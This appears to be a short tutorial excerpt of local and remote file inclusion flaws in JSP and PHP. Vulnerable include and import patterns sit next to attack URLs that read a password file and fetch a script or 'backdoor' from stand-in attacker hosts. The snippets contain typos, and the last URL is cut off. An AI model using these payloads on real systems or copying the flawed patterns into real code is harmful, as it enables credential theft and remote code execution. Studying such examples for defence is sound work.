// code 1
<jsp:include page=”<%=(String)request.getParmeter(“ParamName”)%>”>

// code 2
Page1.jsp?ParamName=/WEB-INF/DB/password

// code 3
<c:import url=”<=request.getParameter(“conf”)%>”>

// code 4
Page2.jsp?conf=https://evilsite.com/attack.js

// code 5
$incfile = $_REQUEST["file"];
include($incfile.".php");

// code 6
http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_